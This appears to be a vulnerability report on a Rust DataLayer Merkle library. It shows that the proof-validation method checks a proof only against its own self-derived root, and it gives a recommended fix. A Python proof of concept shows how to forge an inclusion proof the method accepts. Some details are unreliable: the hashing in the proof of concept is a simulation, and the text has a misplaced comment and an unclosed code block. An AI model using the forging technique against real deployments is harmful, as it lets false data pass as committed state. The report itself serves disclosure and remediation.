### Title
`ProofOfInclusion::valid()` Validates Against Its Own Self-Derived Root Instead of an Externally-Committed Root, Allowing Forged Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary
`ProofOfInclusion::valid()` in the DataLayer Merkle library performs only internal self-consistency checks. Its final comparison `existing_hash == self.root_hash()` is a logical tautology — `self.root_hash()` returns `self.layers.last().combined_hash`, which is the same value `existing_hash` was just set to inside the loop. The function never compares against any externally-committed tree root. An attacker can craft a `ProofOfInclusion` with an arbitrary `node_hash` (claiming any key-value pair is included) and internally-consistent `layers`, and `valid()` returns `true`.

### Finding Description

`root_hash()` derives its return value entirely from the proof's own fields:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← taken from the proof itself
    } else {
        self.node_hash
    }
}
```

`valid()` then uses this self-derived value as the reference for its final check:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {   // ← sets existing_hash = calculated_hash
            return false;
        }
        existing_hash = calculated_hash;              // ← existing_hash == layer.combined_hash
    }
    existing_hash == self.root_hash()                 // ← tautology: always true after loop
}
```

After the loop, `existing_hash` equals the last `layer.combined_hash` (because the loop only continues when `calculated_hash == layer.combined_hash`). `self.root_hash()` also returns `self.layers.last().combined_hash`. The final comparison is therefore always `true` when the loop completes — it provides zero security.

The correct check would compare the proof's derived root against an externally-committed, on-chain root hash (analogous to how `validate_merkle_proof` in the consensus `MerkleSet` correctly checks `tree.get_root() != *root` against a caller-supplied trusted root).

`ProofOfInclusion` is a `Streamable` type, meaning it is fully deserializable from arbitrary bytes. It is exposed as a Python binding (`py_valid()`) and is the primary proof type used by the DataLayer protocol to attest that a key-value pair is included in a committed Merkle tree root stored on-chain in a singleton coin. ### Impact Explanation

An attacker who receives a `ProofOfInclusion` from an untrusted source (e.g., a DataLayer peer) and calls only `proof.valid()` — without separately checking `proof.root_hash() == committed_on_chain_root` — will accept the proof as valid regardless of what `node_hash` it claims. The attacker can construct a proof asserting that any arbitrary `(KeyId, ValueId)` hash is included in the DataLayer tree, and `valid()` returns `true`. This allows forging DataLayer inclusion proofs, letting untrusted input prove invalid state against a committed tree root.

This matches the allowed High impact: **"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."** [3](#0-2) [4](#0-3) [5](#0-4) 

### Likelihood Explanation

`ProofOfInclusion` is a `Streamable` struct fully constructible from arbitrary bytes. The Python binding exposes `valid()` and `root_hash()` as separate methods with no guidance that both must be called. Any Python DataLayer client that calls `proof.valid()` as its sole check — a natural and expected usage given the method name — is vulnerable. The fuzz target and all tests only call `proof.valid()` on proofs generated from the same blob, so the tautology is never caught by existing tests. [6](#0-5) [7](#0-6) 

### Recommendation

`valid()` must accept an externally-committed root hash and compare against it, mirroring how `validate_merkle_proof` in the consensus `MerkleSet` works:

```rust
// consensus MerkleSet — correct pattern
pub fn validate_merkle_proof(proof: &[u8], item: &[u8; 32], root: &[u8; 32]) -> Result<bool, SetError> {
    let tree = MerkleSet::from_proof(proof)?;
    if tree.get_root() != *root {   // ← compares against caller-supplied trusted root
        return Err(SetError);
    }
    Ok(tree.generate_proof(item)?.0)
}
```

Change `valid()` to:

```rust
pub fn valid(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root   // ← compare against externally-committed root
}

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer
import hashlib

# Craft a fake leaf hash for an arbitrary key-value pair
fake_node_hash = bytes([0xAB] * 32)

# Build a single-layer proof that is internally consistent:
# combined_hash = calculate_internal_hash(fake_node_hash, side, sibling_hash)
# We can compute this honestly for any chosen sibling_hash.
sibling_hash = bytes([0xCD] * 32)
# Simulate calculate_internal_hash (left, right concatenation with prefix byte)
combined = hashlib.sha256(b'\x01' + fake_node_hash + sibling_hash).digest()

layer = ProofOfInclusionLayer(
    other_hash_side=1,          # sibling is on the right
    other_hash=sibling_hash,
    combined_hash=combined,     # internally consistent
)

proof = ProofOfInclusion(node_hash=fake_node_hash, layers=[layer])

# valid() returns True even though this proof was never generated from any real MerkleBlob
assert proof.valid(), "Forged proof accepted!"
# root_hash() returns `combined` — an attacker-controlled value, not any on-chain root
assert proof.root_hash() == combined
```

The forged proof passes `valid()` because the final check `existing_hash == self.root_hash()` is a tautology. A caller that trusts `valid()` alone accepts the forged inclusion claim. [9](#0-8) [10](#0-9)
